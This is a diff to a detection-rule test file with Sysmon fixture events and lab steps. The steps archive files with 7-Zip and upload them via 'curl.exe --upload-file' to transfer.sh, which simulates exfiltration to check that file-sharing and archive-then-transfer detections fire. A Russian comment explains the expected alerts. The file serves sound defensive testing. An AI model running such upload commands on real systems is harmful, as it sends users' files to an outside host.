@@ -37,6 +37,15 @@ cases:
       - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\7-Zip\7z.exe', OriginalFileName: 7z.exe, CommandLine: '7z.exe a C:\backup\docs.7z C:\Users\victim\Documents', ParentImage: 'C:\Windows\System32\cmd.exe'}
       - at: 300
         event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\curl.exe', OriginalFileName: curl.exe, CommandLine: 'curl.exe --upload-file C:\backup\docs.7z https://transfer.sh/docs.7z', ParentImage: 'C:\Windows\System32\cmd.exe'}
+# Раннер исполняет вторую и третью строки: первая помечена «Нужен 7-Zip» и остаётся заметкой, а без
+# шага с архивом temporal_ordered exfil_archive_then_transfer не взведётся. Вторая строка - заглушка
+# вместо архива: curl.exe проверяет существование локального файла ДО сети (без файла падает мгновенно,
+# без единого DNS-запроса), поэтому нужен хоть какой-то файл, чтобы curl реально попытался
+# подключиться. Выгрузка curl'ом на transfer.sh (домен есть в common_filesharing_domains) поднимает
+# только th_exfil_filesharing_dns. Поставишь 7-Zip и выполнишь первую строку руками - появится и
+# exfil_archive_then_transfer, раннер покажет его как UNEXPECTED.
+lab_expect: [th_exfil_filesharing_dns]
 lab:
   - 'Нужен 7-Zip: & "C:\Program Files\7-Zip\7z.exe" a -pLab123 C:\Users\Public\lab.7z C:\Windows\win.ini'
+  - 'cmd /c echo stub> C:\Users\Public\lab.7z'
   - 'curl.exe --upload-file C:\Users\Public\lab.7z https://transfer.sh/lab.7z --max-time 5'
